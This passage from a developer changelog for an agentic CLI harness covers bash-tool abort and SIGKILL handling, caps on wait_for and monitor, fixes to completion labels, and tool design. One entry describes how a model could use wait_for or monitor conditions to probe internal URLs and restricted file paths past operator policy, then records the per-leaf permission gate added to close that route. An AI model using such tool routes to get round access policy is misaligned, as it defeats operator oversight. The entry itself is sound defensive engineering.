in ~100ms with SIGTERM. Lesson: don't claim a gap by reading code
alone; verify with a runnable repro. Logged as a meta-lesson
worth folding into CODER_PLAYBOOK §6 (test completeness).

**Real gaps that DID exist:**

1. **No SIGKILL escalation.** Bun.spawn's signal handler sends
   SIGTERM only. A child with `trap "" TERM` (or any unresponsive
   process) would survive caller abort indefinitely.
2. **Misleading terminal classification.** When ctx.signal aborted
   mid-exec, the tool returned `{ exit_code: 143, timed_out: false }`
   — looking like a successful run that returned 143. The model
   would mis-route on this, treating cancellation as a result.
3. **Orphaned-children pipe block.** When `bash` itself dies but
   spawned a child holding stdout (e.g. `bash -c 'sleep 60 &'`),
   the orphan keeps the pipe fd open. Stream reads block until the
   orphan exits naturally — abort returns ~60s late despite the
   bash process being long dead.

**Fix:**

- `src/tools/builtin/bash.ts` — explicit abort listener on
  `ctx.signal` schedules a SIGKILL fallback after 5s grace
  (mirrors `bg/manager`'s `DEFAULT_KILL_GRACE_MS`). The timeout
  path keeps its existing 2s grace (timeouts are already a "ran
  too long" signal — no reason to extend).
- After exec, if `ctx.signal.aborted` was observed during the
  call, return `tool.aborted` instead of letting the bare
  `exit_code` slip through. Audit log + model both see the
  cancellation explicitly.
- `readCapped` accepts an optional `stopSignal`. The bash tool
  fires it via `proc.exited.then(() => readStopAc.abort())` so
  pending stream reads cancel as soon as the bash process itself
  dies, not when orphaned children eventually release the pipe.

**Tests:**

- `caller abort mid-exec returns tool.aborted` — abort during
  `sleep 5`, asserts elapsed < 1s and error_code === 'tool.aborted'.
- `SIGKILL escalation when child ignores SIGTERM (timeout path)` —
  `trap "" TERM; while true; do sleep 0.1; done` with timeout=200ms;
  asserts elapsed in [2s, 4s] window, proving SIGKILL fired after
  the 2s grace (without escalation, would hang forever).

**Verification:** `bun test` 843 pass / 7 skip / 0 fail (+2 new
tests); `tsc --noEmit` clean; `biome check` clean.

**Removed from TODO.md** (`bash tool: thread ctx.signal to the
running subprocess` — done, not deferred).

---

## [2026-04-29] M3 / Step 2.2 — defense-in-depth: wait/monitor wall-clock cap

After the security review that produced the per-leaf policy gate,
walked the recommended hardening list. Findings recorded here.

**Done — wait_for / monitor wall-clock cap (30min):**

The harness's `maxWallClockMs` (default 10min) is the canonical
upper bound on any tool, but operators that bump the harness cap
for long-running builds re-open the gap: a model declaring
`timeout_ms: 86400000` (24h) under a generous harness cap would
pin a tool slot for the full window. Per-tool cap of 30min is
generous for any real probe (build watches, dev-server readiness,
slow integration paths) and conservative against the pathological
case.

- `src/tools/builtin/wait-for.ts` — `MAX_WAIT_MS = 30 * 60 * 1000`
  enforced on `args.timeout_ms` AND on `sleep`'s `duration_ms`
  (otherwise `sleep` is bounded only by `timeout_ms`, which now
  has the cap, but the explicit check fails fast on a clearly
  bogus sleep).
- `src/tools/builtin/monitor.ts` — `MAX_DURATION_MS` mirrored
  on `args.duration_ms`.
- 3 regression tests added (one per site). Error messages cite
  "30min" so operators reading audit logs see the cap by name.

**Audited but no change needed:**

- `src/permissions/matcher.ts` — symlink resolution via
  `realpathSync` is ALREADY in place (lines 14-24), with a clean
  fallback for non-existent paths (realpath the parent + join
  basename). Test coverage in `tests/permissions/symlink.test.ts`.
  My initial security assessment underestimated this surface —
  defense-in-depth is stronger than I credited.
- `src/wait/monitor.ts:257,613` and `src/harness/loop.ts:229,287,384`
  — `X.fired ? 'X' : 'aborted'` patterns. These are 2-source
  binary decisions (duration timer / wall-clock timer vs caller
  signal). They do NOT have a third "deterministic no-match"
  terminal that the wait_for bug exhibited, so the same
  fall-through-aborted bug doesn't apply. Documented as audited
  in the playbook §2 follow-up.
- `src/tools/builtin/bash.ts` — `timedOut` flag is set explicitly
  by the timer, no ambiguity with caller abort. Separate gap:
  `ctx.signal.aborted` mid-exec doesn't thread to `proc.kill()`,
  so a harness-level abort during a long bash leaves the child
  running. Logged as a follow-up in TODO.md (out of scope here).

**Verification:** `bun test` 841 pass / 7 skip / 0 fail (+3 new
cap tests); `tsc --noEmit` clean; `biome check` clean.

---

## [2026-04-29] M3 / Step 2.2 — security fix: per-leaf policy gate on wait_for / monitor

**Bug:** `wait_for` and `monitor` are `category='misc'` (the harness's
`engine.check` returns `allow` for misc), but their leaf conditions
DO touch resources governed by existing policy sections:
- `file_exists` / `file_change` / `file_changes` — fs.read
  (`tools.read_file` allow_paths / deny_paths).
- `http_response` — web.fetch (`tools.fetch_url` allow_hosts /
  deny_hosts).
- `port_open` — same as above (host-based).

In a strict / locked deployment that configures
`tools.fetch_url` and `tools.read_file` to restrict access, a model
could still use `wait_for` to probe arbitrary internal URLs or
sensitive absolute paths, because no per-condition policy check
ran before execution. Identical exposure on `monitor`'s
`file_changes` condition.

**Fix:** the tools self-gate each leaf condition before dispatch.
- `ToolContext` adds an optional `permissionCheck(toolName,
  category, args) → Decision` predicate.
- The harness loop (`src/harness/loop.ts`) wires it as a thin
  delegate over `permissionEngine.check`.
- `src/tools/builtin/wait-for.ts` adds `checkLeafPolicies(cond,
  ctx)` that walks the (possibly composed) condition tree and
  calls the predicate per gated leaf:
    - `file_exists` / `file_change` → `(read_file, fs.read, {path})`
    - `http_response` → `(fetch_url, web.fetch, {url})`
    - `port_open` → `(fetch_url, web.fetch, {url: 'http://host:port'})`
      — synthesizes an http URL so the engine extracts the
      hostname for allow_hosts/deny_hosts matching. Port is
      informational; FetchPolicy is host-based today.
    - `process_exit` / `process_output` → NOT re-gated; the
      process was authorized at spawn time via tools.bash.
    - `sleep` → no gate (no resource access).
- `src/tools/builtin/monitor.ts` adds the same gate for
  `file_changes` (process_output_* leaves are not re-gated).
- New error code `permission.denied` (in `ERROR_CODES`) for
  leaf-level denies. Distinct from the harness-level deny
  (which uses `tool_decided` event).

**Decisions:**
- `confirm` decisions also block at leaves — the leaf has no UI
  surface to escalate a per-condition prompt. Operators that want
  a leaf-only confirm flow can configure deny rules instead.
- `permissionCheck` is REQUIRED on ToolContext (not optional).
  Initial cut made it optional with fall-through-allow to keep
  test changes minimal — but the same default-convenience
  anti-pattern documented in `CODER_PLAYBOOK §2.1` and §8 would
  silently re-introduce the bypass any time a future entrypoint
  constructs a ToolContext without going through the harness
  loop. Tightening to required forces type errors at every
  construction site (currently two: harness loop + test helper).
  The test helper provides a default allow-all predicate so
  non-gating tests stay terse; tests exercising deny paths
  override.
- Reuse existing policy sections (`tools.read_file`,
  `tools.fetch_url`) rather than introducing new wait_for /
  monitor sections — operators that already lock down read_file
  inherit the same allowlist for probes. Fewer dials to keep in
  sync.

**Done:**
- `src/tools/types.ts` — ToolContext.permissionCheck +
  ERROR_CODES.permissionDenied.
- `src/harness/loop.ts` — wires the callback.
- `src/tools/builtin/wait-for.ts` — checkLeafPolicies + call
  site before waitFor dispatch.
- `src/tools/builtin/monitor.ts` — checkLeafPolicy for
  file_changes.
- `tests/tools/_helpers.ts` — makeCtx now spreads
  permissionCheck overrides (was silently dropped before).
- `tests/tools/wait-for.test.ts` — 6 new tests covering deny on
  http_response / port_open / file_exists, composition deny,
  process_* skip, allow happy path.
- `tests/tools/monitor.test.ts` — 2 new tests for file_changes
  deny + process_output_lines skip.

**Why:** principle 6 (explicit trust) — when two policy sections
already encode operator intent for fs/network access, a third
tool that performs the same operations must respect those rules.
A "we'll add wait_for-specific rules later" approach drifts from
sibling parity (Coder Playbook §4.1).

**Verification:** `bun test` 838 pass / 7 skip / 0 fail (+8 new
tests); `tsc --noEmit` clean; `biome check` clean.

---

## [2026-04-29] docs — Coder Playbook (`docs/CODER_PLAYBOOK.md`)

Consolidates the recurring bug patterns found across M2/M3 reviews
into a runtime knowledge artifact for the Forja agent (and humans
reviewing PRs).

**Source material:** every entry derives from a real bug fixed in
this repo's history — categorized by the post-mortem after Step 2.2
plus the three sibling-cancel / no-match-terminal fixes that landed
right after.

**Sections:**
1. Async control flow (Promise.all leaks, AbortSignal cascades,
   real-error-vs-synthetic-rejection in Promise.any).
2. Terminal classification (`aborted` is not the catch-all;
   distinct outcomes need distinct labels).
3. Concurrency on shared state (DB-level monotonic guards;
   transient overrides; runtime validation of schema constraints).
4. Sibling parity (validation, path resolution, convention seams,
   route-by-category).
5. Boundary handling (drain-before-end, overlap windows, bounded
   buffers).
6. Test completeness (assert the terminal label, not just the
   boolean; tests as regression markers).
7. Schema/SELECT discipline (column-add audit, `replace_all`
   pitfalls).
8. The meta-pattern (defaults that are convenient but wrong, and
   the audit reflex after N occurrences of the same class).

**Why a playbook and not just spec entries:** the spec describes
WHAT each subsystem does. The playbook describes HOW to write code
that doesn't regress the bugs we already paid for. Different
audience, different access pattern — the agent reads this when
deciding HOW to implement, not WHAT to implement.

**Pending:** none — file is self-contained. Future bug-class
discoveries should append a new entry to the matching section
rather than start a new doc.

---

## [2026-04-29] M3 / Step 2.2 — post-review fix: all_of sibling leak on sub-throw

Code review follow-up after Step 2.2 was reportedly closed. Single
🟡 bug found and fixed; symmetrical 🟢 issues documented as
deliberate decisions.

**Bug:** in `src/wait/index.ts`, `all_of` orchestration awaited
`Promise.all(tracked)` without intercepting rejections. When a
sub threw a real error (e.g. `process_exit` against an unknown
process_id, which throws `bg process not found` synchronously
on first poll), `Promise.all` rejected immediately. The outer
`finally` only removed the outer-abort listener — `subAc` was
never aborted, so sibling sub-waits kept polling until their
own (outer) timeouts fired. Net effect: timer + signal-listener
leak past the function's return; observable as a 5s wait
instead of <100ms when one sub failed fast.

**Fix:** wrap `Promise.all(tracked)` in try/catch:
1. `subAc.abort()` — cancel siblings.
2. `await Promise.allSettled(subPromises)` — drain so we don't
   return before children clean up timers / handlers.
3. `timeout.cleanup()` — outer timer.
4. Re-throw original error.

Regression test: `tests/wait/composition.test.ts` — all_of with
[file_exists never-appears, process_exit bad-id] under
bgManager. Asserts both the throw propagates AND elapsed < 500ms
(proving siblings were cancelled, not waited out).

**Non-fix (race semantics, deliberate):** in `any_of`, when a
winner emerges, errors thrown by losing siblings are silently
dropped. Considered briefly as "asymmetric error visibility"
but rejected: race contract is "first success wins, others
become irrelevant" — surfacing losing-sibling errors after a
success would break the success contract for noise. Real errors
are still surfaced when EVERY sub rejects (the existing
AggregateError → realError path). Comment in code documents
this as intentional.

**Done:**
- `src/wait/index.ts` — try/catch around all_of's Promise.all,
  abort+drain on rejection (lines ~467 onward).
- Comment update in any_of's allSettled block — documents the
  losing-sibling-error drop as deliberate race semantics.
- `tests/wait/composition.test.ts` — regression test for
  sibling-cancellation timing.

**Why:** principle 9 (reversible by design) requires that a
failed orchestration doesn't leave background polling loops
holding signal listeners. The leak was bounded by the outer
timeout (so not unbounded), but it violated the "wait_for
returns when its decision is made, not later" contract.

**Verification:** `bun test` 828 pass / 7 skip / 0 fail;
`tsc --noEmit` clean; `biome check` clean.

### Follow-up: `process_output` mis-reports normal exit as `aborted`

Second 🟡 caught right after committing the all_of fix.

**Bug:** in the `process_output` drain block, when the process
exits without matching, the no-match return went through
`finishUnmatched(...)`. That helper picks `conditionMet` from
`timeout.timeoutFired() ? 'timeout' : 'aborted'`. With a generous
outer timeout (e.g. 5s) and a process that finishes in ~100ms,
the timeout hadn't fired → `conditionMet='aborted'` despite no
abort signal being raised. Workflows that branch on
`conditionMet==='aborted'` (treating it as a user/system cancel)
would terminate prematurely on a normal process completion.

**Fix:** add `'process_exited'` to the `WaitConditionMet` union
and return it explicitly from the drain block (bypassing
`finishUnmatched`'s aborted/timeout dichotomy). Mirrors the
`MonitorReason='process_exited'` already used by `monitor.ts`,
keeping the two primitives' vocabulary aligned. Tool surface
relays the value via `condition_met` automatically — the type
re-export carries the new variant.

**Done:**
- `src/wait/index.ts` — `WaitConditionMet` adds `'process_exited'`;
  drain-block return uses it explicitly with `timeout.cleanup()`.
- `tests/wait/process.test.ts` — existing test for
  `processExited in payload` now also asserts
  `conditionMet === 'process_exited'`. Comment explains the
  prior buggy behavior so future regressions are caught.

**Why:** principle 7 (trace everything). The conditionMet field
is the trace primitive that downstream code reads to decide
"why did the wait end?". Conflating "process finished" with
"someone aborted me" corrupts that trace and propagates wrong
decisions into hooks, recap, audit.

**Verification:** `bun test` 828 pass / 7 skip / 0 fail;
`tsc --noEmit` clean; `biome check` clean.

### Follow-up: composition no-match also mis-reports as `aborted`

Same root cause as the `process_output` follow-up, one level up
in the composition layer.

**Bug:** in `src/wait/index.ts`, both branches of the composition
handler returned `finishUnmatched(...)` for deterministic
no-match outcomes:
- `any_of` — every sub resolved with `matched=false` before the
  outer timeout (e.g. multiple `process_output` subs whose
  processes exited without matching).
- `all_of` — a sub returned `matched=false` and triggered the
  short-circuit (e.g. one `process_output` sub exited).
In both cases, `timeout.timeoutFired()` is false and no caller
abort happened, so `finishUnmatched` defaults to
`conditionMet='aborted'`. Workflows branching on
`conditionMet==='aborted'` (treating it as a user/system cancel)
prematurely terminated on a deterministic composition outcome.

**Fix:** new helper `finishUnmatchedComposition(kind, payload)`
with priority `outer timeout > caller abort > kind`. Both
composition no-match paths now use it. The `WaitConditionMet`
union already includes `'all_of'` / `'any_of'` (previously only
emitted on match) — it now also signals "composition resolved
deterministically without a match", symmetric with how
`finishMatched` uses the same kind.

**Decision:** outer timeout still wins over kind. If the outer
timeout fires *while* a composition is being resolved (e.g.
during the inter-poll sleep), the wait was effectively cut
short — `'timeout'` is the more specific signal. Same for
caller abort. The kind label is reserved for "every sub ran to
its own conclusion before the outer signal fired".

**Done:**
- `src/wait/index.ts` — adds `finishUnmatchedComposition`,
  rewires `any_of` no-winner block + `all_of` firstFail block
  to use it. Comments explain the distinction.
- `tests/wait/composition.test.ts` — two regression tests:
  `all_of: deterministic sub-failure reports kind, not aborted`
  and `any_of: every sub deterministically fails reports kind,
  not aborted`. Both use `process_output` against a process
  that exits early to produce the deterministic-fail signal.

**Why:** principle 7 (trace everything), principle 8 (failure
modes are first-class). `aborted` and `timeout` both mean "the
wait did not run to its natural conclusion". A composition
that ran every sub to completion DID reach a conclusion — the
trace primitive must reflect that.

**Verification:** `bun test` 830 pass / 7 skip / 0 fail;
`tsc --noEmit` clean; `biome check` clean.

---

## [2026-04-29] M3 / Step 2.2.4 — monitor (streaming observation, closes Step 2.2)

Closes Step 2.2 with the streaming-observation half of spec
§7.3.1: a `monitor` tool that collects events over a duration
and returns the batch when the budget is exhausted. Distinct
from `wait_for` (which stops at first match): the model gets
a list of events, not a binary matched/no-match.

Use cases the spec calls out: tail logs for warnings/errors
across a build, watch a file tree for compilation output,
collect every line a dev server emits during startup.

**Slice scope (2.2.4):**

| Component | Status | Notes |
|---|---|---|
| `src/wait/monitor.ts` | NEW | `monitor(condition, opts)` primitive. Polls per-condition, accumulates events, terminates on durationMs / maxEvents / abort / process_exited |
| Condition `process_output_lines` | NEW | Each newline-delimited line in stdout/stderr is an event. Partial-line buffering across poll boundaries |
| Condition `process_output_pattern` | NEW | Each regex match (multi-match via /g) is an event. Tool layer compiles user pattern with /g — opposite of wait_for which rejects /g |
| Condition `file_changes` | NEW | Each mtime change on a single path is an event. Glob expansion deferred (single path only for v1) |
| Tool `monitor` | NEW | Separate from wait_for — different return shape. category=misc, planSafe=true. Tool count 10 → 11 |
| Tests | NEW | tests/wait/monitor.test.ts + tests/tools/monitor.test.ts |

**Decisions to make explicit upfront:**

- **`monitor` is a separate tool, not a `wait_for` extension.**
  Return shape is fundamentally different (events array
  vs single match). Sharing the wait_for tool would force
  a discriminated union on the OUTPUT shape which models
  consume — confusing for the LLM and asymmetric in the
  schema. Two tools with crisp single-purpose surfaces.
- **`/g` flag IS used internally for pattern matching.**
  For `process_output_pattern`, we need ALL matches in a
  chunk, not just the first. `String.matchAll` requires
  /g. Tool layer compiles user pattern with /g (opposite
  of wait_for's `process_output` which rejects /g — there
  we used `RegExp.exec` once and /g would carry
  lastIndex state across calls breaking the per-poll
  re-read pattern). Different primitive, different
  constraint.
- **Observational reads, same as wait_for.** Uses
  `manager.readOutput` with explicit `sinceStdout`/
  `sinceStderr` so the model's persisted cursor stays
  untouched. A subsequent canonical `bash_output` sees
  the SAME bytes the monitor collected.
- **Single path for `file_changes`, no glob.** Spec
  mentions glob; v1 supports a single absolute or
  relative-to-ctx.cwd path. Glob expansion needs a
  watcher across multiple files (chokidar-style), which
  reopens the polling-vs-native-watcher decision from
  Step 2.2.1. Defer until a real workflow surfaces it.
- **Termination reasons enumerated.** `'duration'` (the
  durationMs cap fired), `'max_events'` (event count
  reached the cap), `'aborted'` (caller signal),
  `'process_exited'` (process_* conditions only —
  monitor stops when the source process is gone).
- **Empty pattern list / no events is a valid result.**
  `monitor` returns `{ events: [], reason: 'duration' }`
  when nothing matched. Not an error. The model decides
  what to do with empty observations.
- **Process_* events drain on exit.** Same lesson from
  Step 2.2.2's drain fix: when a process exits with
  pending bytes, scan the tail before terminating.
  Pattern matches in the tail still produce events.

**Out of scope (deferred):**

- **Glob in `file_changes`.** Pull-in: when a workflow
  needs "watch every TS file under src/".
- **Per-line max length cap.** A pathological process
  emitting a 10MB single line (no \n) would buffer
  indefinitely. Default `readOutput` maxBytes (64KB)
  caps per-poll growth; a separate cap on accumulated
  buffer would be a real defense. Pull-in: if a
  workflow surfaces it.
- **Event ordering across streams.** Events from
  stdout and stderr are interleaved by poll round, not
  by their ACTUAL emission timestamps (we don't have
  per-byte timestamps from the kernel). Documented as
  a risk — the events list is approximately ordered.

**Spec reference:** `AGENTIC_CLI.md §7.3.1` (monitor
clauses), `src/wait/index.ts` (sibling primitive).

**Done:**

- `src/wait/monitor.ts` — `monitor(condition, opts)`
  primitive. Polls per-condition, accumulates events,
  terminates on durationMs / maxEvents / abort /
  process_exited. Sibling to waitFor; lives in the
  same module barrel.
- 3 condition kinds:
  - `process_output_lines` — newline-delimited lines
    from bg stdout/stderr. Partial-line buffer carried
    across polls; `\r\n` normalized to `\n`. On
    process exit, drains any unterminated tail as a
    final event with `partial: true`.
  - `process_output_pattern` — every match (multi-
    match via /g via `String.matchAll`) becomes an
    event. The compiled RegExp ALWAYS has /g —
    opposite of wait_for's `process_output` which
    rejects /g (different primitive, different
    constraint).
  - `file_changes` — every mtime change on a single
    path. Glob deferred (single path only for v1).
- Termination reasons enumerated:
  `'duration'` / `'max_events'` / `'aborted'` /
  `'process_exited'`. The result also carries
  `processStatus` and `processExitCode` (when
  applicable) so the model knows whether the source
  process is still running on duration-termination
  vs already exited.
- Observational reads via `manager.readOutput` with
  explicit `sinceStdout`/`sinceStderr` — model
  cursor untouched. Test pins this contract: a
  monitor call leaves the cursor at 0; subsequent
  canonical `bash_output` sees the same content the
  monitor observed.
- `monitor` tool (`src/tools/builtin/monitor.ts`):
  - `category: 'misc'`, `planSafe: true` —
    observational, same as wait_for.
  - Schema mirrors monitor input shape with
    snake_case fields. Pattern is string + is_regex
    (default false → literal escape). Both modes
    compile with /g.
  - `file_changes.path` resolves against `ctx.cwd`;
    `..` segments rejected (same as wait_for's
    file_exists / file_change).
  - `bgManager` validation walks the condition: any
    `process_output_*` requires it; missing manager
    → `bg.manager_unavailable`. Unknown / cross-
    session process_id → `bg.process_not_found`
    (uniform with bash_output / wait_for).
- Tool count: 10 → 11. Bootstrap test updated.
- 17 unit tests in `tests/wait/monitor.test.ts`:
  every-line capture, stream separation, observational
  contract, max_events termination, duration
  termination with `processStatus: 'running'`,
  trailing partial-line drain on exit, every-regex-
  match collection, max_events=1 short-circuit,
  process_exited payload, file_changes (changes +
  no-changes), abort signal handling (mid + pre-
  aborted), bgManager validation (process_* requires
  it, file_changes doesn't), unknown id throws.
- 12 tool tests in `tests/tools/monitor.test.ts`:
  end-to-end happy paths for all 3 conditions,
  literal vs is_regex, ctx.cwd path resolution,
  validation (unknown kind / empty pattern / invalid
  regex / `..` / negative duration), bg manager
  dependency (`bg.manager_unavailable`,
  `bg.process_not_found`, file_changes works without
  manager).
- Total: 812 pass / 7 skip / 0 fail. Typecheck +
  lint green.

**Decisions taken (not in opener):**

- **Tighter default poll interval (200ms vs
  wait_for's 500ms).** monitor is generally observing
  rapidly-changing state (logs flowing, files being
  written by a build). 500ms felt sluggish for that
  use case. Configurable via `pollIntervalMs`.
- **Default `maxEvents = 100`.** A bounded cap so the
  payload returned to the model is predictable in
  size. Models can override; the default keeps a
  "tail until done" call safe even for chatty
  processes.
- **Partial-line drain on process exit.** When
  `process_output_lines` sees the source exit, any
  unterminated tail in the buffer becomes a final
  event with `partial: true`. Without this, the
  trailing line of a crash log (no \n before the
  process died) would be silently dropped.
- **`processStatus` carried across termination
  reasons.** Initially the field was only set on
  `process_exited`; tests revealed that a model
  hitting `duration` on a still-running process gets
  no signal about the process state. Now: every
  termination path includes `processStatus` /
  `processExitCode` from the last successful
  `readOutput` poll, so the model can distinguish
  "duration ran out, process is still running"
  (continue polling later) from "duration ran out,
  process happens to have exited" (no point
  continuing).
- **Removed unused `waitForExit` helper from the
  test file.** The lines tests don't need to wait for
  exit explicitly — monitor's `process_exited`
  termination is the natural signal. Lint complained
  about the unused import; rather than suppress, just
  removed.

**Code review fixes applied before commit:**

- **`process_output_pattern` overlap + dedup.** Was:
  each poll read strictly new bytes; a pattern
  straddling a poll boundary disappeared from the
  events list. Same class of bug as wait_for's
  `process_output` (fixed in commit 2bb1e36). Now:
  `PATTERN_OVERLAP_BYTES = 64` carry-over buffer per
  stream prepended to the new chunk before `matchAll`.
  Matches whose end falls inside the buffer (i.e.,
  entirely already emitted last poll) are skipped —
  emit only matches that extend into new bytes. Two
  regression tests pin the contract: a marker
  straddling `printf 'BLT-MON-'; sleep 0.1; printf
  'TOKEN-99'` is matched once; a single short marker
  observed across many polls emits exactly one event
  (no double-emit).
- **Removed defensive non-/g fallback.** Was: pattern
  scan path branched on `condition.pattern.global` and
  fell back to a single `RegExp.exec` for non-/g —
  fail-quietly behavior that contradicted monitor's
  "every match" semantics. Now: throw upfront with a
  clear message. Tool layer always compiles with /g;
  programmatic callers get a loud failure instead of
  silent semantic drift. Regression test pins:
  passing a non-/g regex rejects with `/global.*'g'/`.
- **Snake_case payload keys at the tool boundary.**
  Was: top-level result fields used snake_case
  (`condition_met`, `elapsed_ms`) but inner payloads
  passed through with camelCase (`mtimeMs`,
  `processId`, `matchedIndex`). Models that learned
  snake from `process_id` got tripped by camel in
  payloads. Now: shared helper `src/tools/_keys.ts`
  recursively converts payload keys to snake_case;
  applied at the boundary in both `wait_for` and
  `monitor` tools. Internal types stay camelCase
  (idiomatic TS); conversion is a tool-output detail.
  Tool tests updated to expect snake (e.g.
  `r.payload?.mtime_ms`); module-level tests stay
  camelCase since they exercise the wait module
  directly.

**Risks documented:**

- **Per-line max length unbounded.** A pathological
  process emitting a 10MB single line (no \n) would
  buffer indefinitely. Default `readOutput` maxBytes
  (64KB) caps per-poll growth; a separate cap on
  accumulated buffer would be a real defense.
  Pull-in: if a workflow surfaces it, add
  `maxLineBytes` per condition with truncation
  marker.
- **Event ordering across streams is poll-batch
  approximate.** Events from stdout and stderr are
  interleaved by poll round, not by their actual
  emission timestamps (we don't have per-byte kernel
  timestamps). For a log with interleaved
  stdout/stderr writes within a single poll window,
  the order is "stdout first, then stderr" by our
  implementation, NOT chronological. Document; if a
  workflow needs strict ordering, the bg subsystem
  would need a unified merged-stream output (spec
  §7.3 doesn't currently call for this).
- **`file_changes` mtime granularity.** Same risk
  as wait_for's `file_change`. Documented in 2.2.1
  risks.
- **Glob expansion for `file_changes` deferred.**
  Spec mentions `path: string | glob`; v1 supports
  single path. Pull-in: when "watch every TS file
  under src/" becomes a real workflow.

**Step 2.2 closure:** all four sub-steps (2.2.1
non-bg conditions, 2.2.2 process_*, 2.2.3
composition, 2.2.4 monitor) shipped. The wait/monitor
half of spec §7.3.1 is complete.

---

## [2026-04-29] M3 / Step 2.2.3 — wait_for composition (all_of / any_of)

Closes the `wait_for` tool surface with the composition layer
spec §7.3.1 calls out: `all_of` (AND — wait for every
sub-condition) and `any_of` (OR — race for the first match).
Recursive over the 7 existing condition kinds (sleep,
file_exists, file_change, port_open, http_response,
process_exit, process_output) so a model can express
"wait for the dev server to be ready (port_open OR
http_response on /health) AND the build artifact to be
written (file_exists)" in a single tool call.

`monitor` (the third half of §7.3.1, streaming events) is
split into Step 2.2.4 — different primitive (returns
`{ events[], reason }`, separate tool surface).

**Slice scope (2.2.3):**

| Component | Status | Notes |
|---|---|---|
| `WaitCondition.all_of` | NEW | Recursive: `{ kind: 'all_of'; conditions: WaitCondition[] }` |
| `WaitCondition.any_of` | NEW | Same shape, OR semantics |
| `WaitConditionMet.all_of` / `any_of` | NEW | Distinct success kinds for payload routing |
| Dispatch: any_of | NEW | Promise.any over sub-waits — first match wins. Loser sub-waits are aborted via shared AbortController. allSettled at the end ensures no leaked timers |
| Dispatch: all_of | NEW | Spawn sub-waits in parallel, short-circuit abort on first failure (matched=false). Promise.all waits for all to settle (aborted siblings resolve quickly) |
| Tool: recursive `buildCondition` | UPDATED | Validates nested conditions[]. Depth limit prevents adversarial nesting |
| Tests | NEW | `tests/wait/composition.test.ts` + tool-level cases |

**Decisions to make explicit upfront:**

- **`any_of` uses `Promise.any`, not `Promise.race`.** Race
  resolves on first SETTLED promise — including a sub
  that timed out. We want first MATCHED. Promise.any
  rejects only when all promises reject; we map
  matched=false → rejection, matched=true → resolution.
  Cleaner than ad-hoc filtering.
- **`all_of` short-circuits on first failure.** As soon
  as any sub returns matched=false, we abort the rest
  via shared AbortController. Avoids paying the full
  outer timeout for siblings that can't possibly help.
- **Sub-waits inherit `bgManager` and a shared abort
  signal.** Process_* conditions can appear inside
  composition (`any_of([{ kind: 'process_exit'... }])`).
  We thread `options.bgManager` to sub-calls; missing
  manager fails fast at the sub's entry validation.
- **Depth limit = 5.** `all_of([all_of([all_of(...)])])`
  could be unbounded otherwise. Hard cap defends
  against adversarial / buggy model output. Pulled in
  if a real workflow needs deeper.
- **Empty `conditions` arrays are well-defined:**
  - `all_of([])` matches IMMEDIATELY (vacuously true —
    the universal quantifier over empty set is true).
  - `any_of([])` times out (vacuously false — the
    existential over empty set is false).
  - Both documented in the schema; no special-case
    error.
- **PolicyMode interactions stay at the leaf.** A
  composition has no policy decision — only its leaves
  (file_exists path, port_open host, etc.) do. Same as
  Step 2.2.1's "no path policy gate on wait_for" risk;
  composition doesn't make that gap better or worse.

**Out of scope (2.2.4):**

- `monitor` — streaming events with LLM-runs-at-end
  semantics. Different return shape, different tool.

**Spec reference:** `AGENTIC_CLI.md §7.3.1` (composition
clauses), `src/wait/index.ts` (existing dispatch).

**Done:**

- WaitCondition extended with `all_of` and `any_of`,
  both recursive over `WaitCondition[]`.
  WaitConditionMet adds `'all_of'` and `'any_of'`
  success kinds.
- Composition handlers run BEFORE the poll loop in
  `waitFor` (composition orchestrates, doesn't poll).
  Sub-waits get a derived AbortController (`subAc`)
  whose signal is what they receive as their `signal`
  option. Outer-abort propagates to subAc via a
  `once: true` listener; on resolution we abort subAc
  to cancel siblings.
- `any_of` uses `Promise.any` over sub-promises
  mapped so matched=false → rejection. First MATCH
  wins (not first settled). Loser sub-waits are
  cancelled; `Promise.allSettled` ensures we don't
  return before they clean up. Payload reports
  `{ matchedIndex, matchedKind, matchedPayload? }`.
- `all_of` uses `Promise.all` over tracked sub-promises;
  the first failure (matched=false) sets `firstFail`
  and aborts siblings via `subAc`. Promise.all still
  awaits everyone settling (aborted siblings resolve
  quickly). Payload reports `{ matched: N }` on success
  or `{ failedIndex, failedKind, failedPayload? }` on
  failure.
- Empty-array semantics:
  - `all_of([])` returns matched=true with `matched: 0`
    immediately.
  - `any_of([])` waits out the outer `timeoutMs` then
    returns matched=false / conditionMet=`'timeout'`.
- Tool surface adds `all_of` / `any_of` kinds to the
  schema. `buildCondition` recurses with
  `depth + 1`; `MAX_COMPOSITION_DEPTH = 5` rejects
  unbounded nesting. `containsProcessCondition`
  walks the (possibly composed) condition tree so
  `bgManager` validation at the tool boundary catches
  process_* nested in composition (e.g.,
  `any_of([process_exit, sleep])`) — surfaces as
  `bg.manager_unavailable`, not a mid-wait
  `wait.internal_error`.
- 11 unit tests in `tests/wait/composition.test.ts`:
  any_of races first match, cancels losers,
  empty array timeouts, captures matched sub-payload;
  all_of waits for everyone, short-circuits on first
  failure, empty array immediate match, payload on
  failure; nested any_of inside all_of; aborted
  signal propagates to sub-waits.
- 5 tool tests in `tests/tools/wait-for.test.ts`:
  empty arrays, recursive validation rejects nested
  bad kind, depth limit rejects deep nesting,
  process_* nested → bg.manager_unavailable,
  end-to-end any_of via tool surface.
- Total: 780 pass / 7 skip / 0 fail. Typecheck +
  lint green.

**Decisions taken (not in opener):**

- **Listener cleanup in `finally`.** The composition
  handler's outer-abort listener is added to
  `combinedSignal` and removed in a `finally` block.
  Without this, nested composition (sub-wait inside a
  parent) would leave a dangling listener on the
  parent's signal until both finished — small leak,
  documented for hygiene.
- **`Promise.any` rejection ignored, not aggregated.**
  When all sub-promises reject (no match), Promise.any
  throws AggregateError with the individual results.
  We swallow the aggregate and call `finishUnmatched()`
  with no payload — the conditionMet will reflect
  whether the outer timeout or caller signal fired.
  Surfacing per-sub failure reasons in any_of's payload
  was considered; rejected because the model only cares
  that NONE matched, and the outer reason (timeout vs
  abort) is what's actionable. all_of's failure DOES
  surface the failing sub because that IS actionable
  ("which dependency failed?").
- **Depth limit at the tool boundary, not the wait
  module.** Programmatic callers building WaitConditions
  in code can compose as deep as they want (TypeScript's
  recursive type signals the intent). The depth limit
  is specifically to defend against adversarial /
  buggy MODEL output via the tool — the validation
  layer is the right gate.

**Code review fixes applied before commit:**

- **`any_of` distinguishes real errors from
  matched=false rejections.** Was: Promise.any's
  AggregateError was caught silently — a composition
  with all sub-waits rejecting (e.g., a single-element
  any_of where the sub throws `bg process not found`)
  silently reported timeout. Now: AggregateError.errors
  is scanned for Error instances; the first real one is
  re-thrown, propagating up through the tool layer as
